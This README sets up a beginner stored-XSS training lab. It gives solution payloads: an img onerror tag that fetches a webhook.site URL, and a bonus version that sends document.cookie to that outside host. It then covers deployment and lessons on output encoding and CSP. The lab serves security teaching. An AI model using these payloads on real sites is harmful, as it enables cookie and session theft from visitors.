# Simple Stored XSS Challenge (Beginner)

A beginner-friendly **Stored XSS** lab that teaches why filtering only `<script>` tags is not enough.

Uses **webhook.site** so students can clearly see the XSS fire.

## Challenge Goal

1. Go to [webhook.site](https://webhook.site) and copy your unique URL.
2. Post a comment that triggers a request to your webhook when anyone views the guestbook.
3. **The server blocks `<script>` tags** — you must use another tag.

### Solution Hint
Use an image tag with an error handler:

```html
<img src=x onerror="fetch('https://webhook.site/your-unique-id')">
```

### Bonus
Steal the cookie named `flag` and send it to your webhook:

```html
<img src=x onerror="fetch('https://webhook.site/your-unique-id?c='+document.cookie)">
```

## Deploy on Render (Free)

1. Create a free account at [render.com](https://render.com) (login with GitHub is easiest).
2. Push this folder to a GitHub repository.
3. In Render Dashboard → **New** → **Web Service**.
4. Connect your repo.
5. Settings:
   - **Runtime**: Python 3
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: `gunicorn app:app`
   - **Instance Type**: Free
6. Click **Create Web Service**.

Your lab will be live at `https://your-service-name.onrender.com`.

> Note: Free tier sleeps after 15 min of inactivity. First request after sleep takes ~30-60 seconds.

## Local Testing

```bash
pip install -r requirements.txt
python app.py
```

Open http://127.0.0.1:5000

## What students learn

- Stored XSS = payload is saved and executed for every visitor
- Blacklisting only `<script>` is easily bypassed
- Event handlers (`onerror`, `onload`, etc.) are powerful XSS vectors
- How to use webhook.site / requestbin as a simple callback server
- Importance of proper output encoding / Content Security Policy
